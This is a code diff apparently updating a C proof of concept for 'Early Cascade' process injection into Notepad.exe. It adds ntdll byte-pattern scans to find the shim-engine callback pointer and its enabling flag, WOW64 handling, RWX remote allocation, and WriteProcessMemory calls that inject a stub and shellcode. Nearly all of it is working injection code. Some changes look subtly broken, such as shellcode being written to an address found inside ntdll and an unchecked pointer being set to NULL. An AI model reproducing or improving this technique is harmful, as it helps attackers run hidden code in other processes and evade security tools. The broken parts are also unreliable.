@@ -6,8 +6,21 @@
 
 
 #include <Windows.h>
+#include <stdio.h>
 
 #define TARGET_PROCESS "Notepad.exe"
+#define MAX_PATTERN_SIZE 0x20
+#define CHECK_IN_RANGE(dwBasePtr, dwPtr, dwSecPtr) \
+    ( \
+        dwPtr >= (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress) && \
+        dwPtr <  (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress + ((PIMAGE_SECTION_HEADER) dwSecPtr)->Misc.VirtualSize) ) 
+
+
+typedef struct _CascadePattern {
+    BYTE pData[MAX_PATTERN_SIZE];
+    UINT8 un8Size;
+    UINT8 un8PcOff; // Rip - PointerToOffset
+} CascadePattern;
 
 
 BYTE x64_stub[] =   
@@ -87,8 +100,25 @@ LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress) {
     DWORD dwValue;
     DWORD_PTR dwPtr;
     DWORD_PTR dwTextPtr;
+    DWORD_PTR dwTextEndPtr;
     DWORD_PTR dwMRDataPtr;
     DWORD_PTR dwResultPtr;
+    CascadePattern aPatterns[] = { /* We are searching for these patterns: */
+        {
+            /*
+                
+                8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
+                8bc2                 mov     eax, edx
+                488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
+            */
+            .pData = "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B\x3D",
+            .un8Size = 0x0C,
+            .un8PcOff = 0x04
+        },
+        
+        /* Sentinel */
+        { 0x00 }
+    };
 
     /* Nt Headers */
     dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;
@@ -104,45 +134,46 @@ LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress) {
         if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
             dwTextPtr = dwPtr;
 
-        /* Find .mrdata section address */
+        /* Find .mrdata section header */
         if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
-            dwMRDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;    
+            dwMRDataPtr = dwPtr;   
 
         /* Next section header */
         dwPtr += sizeof(IMAGE_SECTION_HEADER);
     }
 
-    /* Points to the beginning of .text section */
-    dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;
+    /* Look for all specified patterns */
+    for ( CascadePattern *pPattern = aPatterns; pPattern->un8Size; pPattern++ ) {
+        /* Points to the beginning of .text section */
+        dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;
 
-    /* The end of .text section */
-    dwTextPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;
+        /* The end of .text section */
+        dwTextEndPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;
 
-    /*
-        We are searching for this pattern:
-        8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
-        8bc2                 mov     eax, edx
-        488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
-    */
+        while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextEndPtr-dwResultPtr, pPattern->pData, pPattern->un8Size) ) {
+            /* Get the offset address */
+            dwResultPtr += pPattern->un8Size;
 
-    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B", 11) ) {
-        /* Get the offset address */
-        dwResultPtr += 12;
+            /* Ensure the validity of the opcode we rely on */
+            if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) {
+                /* Fetch the address */
+                dwPtr = (DWORD_PTR) ( *(DWORD32 *) dwResultPtr ) + dwResultPtr + pPattern->un8PcOff;
 
-        /* Ensure the validity of the opcode we rely on */
-        if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) {
-            /* Set the offset address */
-            if ( ppOffsetAddress )
-                ( *ppOffsetAddress ) = (LPVOID) dwResultPtr;
+                /* Is that address in the range we expect!? */
+                if ( CHECK_IN_RANGE((DWORD_PTR) hNtDLL, dwPtr, dwMRDataPtr) ) {
+                    /* Set the offset address */
+                    if ( ppOffsetAddress )
+                        ( *ppOffsetAddress ) = (LPVOID) dwResultPtr;
 
-            /* Fetch the address */
-            dwPtr = (DWORD_PTR) ( *(DWORD32 *) dwResultPtr ) + dwResultPtr + 0x4;
-
-            /* Is that address in the range we expect!? */
-            if ( dwPtr > dwMRDataPtr+0x240 && dwPtr < dwMRDataPtr+0x280 )
-                return (LPVOID) dwPtr;
+                    return (LPVOID) dwPtr;
+                }
+            }
         }
+
     }
+
+    /* Failed to find the address */
+    ( *ppOffsetAddress ) = NULL;
 
     return NULL;
 }
@@ -153,6 +184,27 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     DWORD_PTR dwResultPtr;
     DWORD_PTR dwEndPtr;
     DWORD_PTR dwDataPtr;
+    CascadePattern aPatterns[] = { /* We are looking for these patterns: */
+        {
+            /*
+                c605??????0001       mov     byte ptr [ntdll!g_ShimsEnabled (????????????)], 1
+            */
+            .pData = "\xc6\x05",
+            .un8Size = 0x02,
+            .un8PcOff = 0x05
+        },
+        {
+            /*
+                443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
+            */
+            .pData = "\x44\x38\x25",
+            .un8Size = 0x03,
+            .un8PcOff = 0x04
+        },
+        
+        /* Sentinel */
+        { 0x00 }
+    };
 
     /* Nt Headers */
     dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;
@@ -164,9 +216,9 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;
 
     while ( dwValue-- ) {
-        /* Find .data section address */
+        /* Find .data section header */
         if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".data") == 0 ) {
-            dwDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;  
+            dwDataPtr = dwPtr;   
             break; 
         } 
 
@@ -174,29 +226,30 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
         dwPtr += sizeof(IMAGE_SECTION_HEADER);
     }
 
-    /* Searching from the address where we found the offset of SE_DllLoadedAddress */
-    dwPtr = dwEndPtr = (DWORD_PTR) pDllLoadedOffsetAddress;
+    /* Look for all specified patterns */
+    for ( CascadePattern *pPattern = aPatterns; pPattern->un8Size; pPattern++ ) {
+        /* Searching from the address where we found the offset of SE_DllLoadedAddress */
+        dwPtr = dwEndPtr = (DWORD_PTR) pDllLoadedOffsetAddress;
 
-    /* End of block we are searching in */
-    dwEndPtr += 0xFF;
+        /* Also take a look in the place just before this address */
+        dwPtr -= 0xFF;
 
-    /*
-        We are looking for this pattern:
-        443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
-    */
-
-    while ( dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr-dwPtr, "\x44\x38\x25", 3) ) {
-        /* Jump into the offset */
-        dwPtr += 0x3;
+        /* End of block we are searching in */
+        dwEndPtr += 0xFF;
         
-        /* Ensure the validity of the opcode we rely on */
-        if ( (*(BYTE *)(dwPtr + 0x3)) == 0x00 ) {
-            /* Fetch the address */
-            dwResultPtr = (DWORD_PTR) ( *(DWORD32 *) dwPtr ) + dwPtr + 0x4;            
+        while ( dwPtr = (DWORD_PTR) find_pattern((LPBYTE)dwPtr, dwEndPtr-dwPtr, pPattern->pData, pPattern->un8Size) ) {
+            /* Jump into the offset */
+            dwPtr += pPattern->un8Size;
+            
+            /* Ensure the validity of the opcode we rely on */
+            if ( (*(BYTE *)(dwPtr + 0x3)) == 0x00 ) {
+                /* Fetch the address */
+                dwResultPtr = (DWORD_PTR) ( *(DWORD32 *) dwPtr ) + dwPtr + pPattern->un8PcOff;   
 
-            /* Is that address in the range we expect!? */
-            if ( dwResultPtr > dwDataPtr+0x6800 && dwResultPtr < dwDataPtr+0x6F00 )
-                return (LPVOID) dwResultPtr;
+                /* Is that address in the range we expect!? */
+                if ( CHECK_IN_RANGE((DWORD_PTR) hNtDLL, dwResultPtr, dwDataPtr) )
+                    return (LPVOID) dwResultPtr;
+            }
         }
     }
 
@@ -213,6 +266,9 @@ int main(int argc, char **argv) {
     LPVOID pPtr;
     int nSuccess = EXIT_FAILURE;
     BOOL bEnable = TRUE;
+#if defined(_WIN32) && !defined(_WIN64)
+    BOOL bIsWow64 = FALSE;
+#endif
 
     puts(
 
@@ -254,17 +310,33 @@ int main(int argc, char **argv) {
     hNtDLL = GetModuleHandleA( "NtDLL" );
     printf( "[+] NtDLL Base Address = 0x%p\n", hNtDLL );
 
-    puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
-    pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
-    printf( "[+] Found the Callback Address at 0x%p\n", pSE_DllLoadedAddress );
-
-    puts( "[*] Dynamically Search for the Enabling Flag Address ( g_ShimsEnabled )");
-    pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );
-    printf( "[+] Found the Enabling Flag Address at 0x%p\n", pShimsEnabledAddress );
 
     do {
 
-        puts( "[*] Remotley allocate memory for both stub & shellcode" );
+#if defined(_WIN32) && !defined(_WIN64)
+        if ( IsWow64Process(pi.hProcess, &bIsWow64) && bIsWow64 )
+            goto CASCADE;    
+#endif
+
+#if !defined(_WIN64)
+        puts( "[-] This PoC targets x64 processes only" );
+        break;
+#endif
+
+CASCADE:
+        puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
+        if ( !(pSE_DllLoadedAddress = find_SE_DllLoadedAddress(hNtDLL, &pPtr)) )
+            break;
+
+        printf( "[+] Found the Callback Address at 0x%p\n", pSE_DllLoadedAddress );
+
+        puts( "[*] Dynamically Search for the Enabling Flag Address ( g_ShimsEnabled )");
+        if ( !(pShimsEnabledAddress = find_ShimsEnabledAddress(hNtDLL, pPtr)) )
+            break;
+
+        printf( "[+] Found the Enabling Flag Address at 0x%p\n", pShimsEnabledAddress );
+
+        puts( "[*] Remotely allocate memory for both stub & shellcode" );
         if ( !(pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(x64_stub) + sizeof(x64_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) )
             break;
 
@@ -284,7 +356,7 @@ int main(int argc, char **argv) {
         puts( "[+] Our stub has been successfully injected into the remote process" );
 
         puts( "[*] Injecting our Shellcode" );
-        if ( !WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub)), x64_shellcode, sizeof(x64_shellcode), NULL) )
+        if ( !WriteProcessMemory(pi.hProcess, pPtr, x64_shellcode, sizeof(x64_shellcode), NULL) )
             break;
 
         puts( "[+] Our Shellcode has been successfully injected into the remote process" );
@@ -313,8 +385,14 @@ int main(int argc, char **argv) {
 
     } while( FALSE );
 
-    if ( nSuccess == EXIT_FAILURE )
+    if ( nSuccess == EXIT_FAILURE ) {
         puts( "[-] Unfortunately, failed to cascade the process!" );
+
+        if ( pi.hProcess )
+            TerminateProcess( pi.hProcess, EXIT_FAILURE );
+
+        puts( "[*] Target process has terminated" );
+    }
 
     puts( "[*] Cleaning up" );
     if ( pi.hThread )
